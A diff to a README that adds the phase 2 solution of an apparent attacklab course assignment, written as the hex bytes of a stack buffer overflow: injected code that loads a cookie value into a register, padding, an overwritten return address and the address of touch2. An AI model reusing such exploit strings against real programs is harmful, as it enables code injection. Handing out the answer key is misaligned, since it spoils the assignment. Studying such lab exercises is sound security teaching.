@@ -13,6 +13,15 @@ see assignment details at attacklab.pdf
 ```
 
 ## phase 2 solution
+```
+// injected code with total 40 bytes
+48 c7 c7 1f 25 3c 37 c3
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+// address of register and touch2
+18 22 65 55 00 00 00 00
+a0 16 40 00 00 00 00 00 
+```
 
 ## phase 3 solution
 
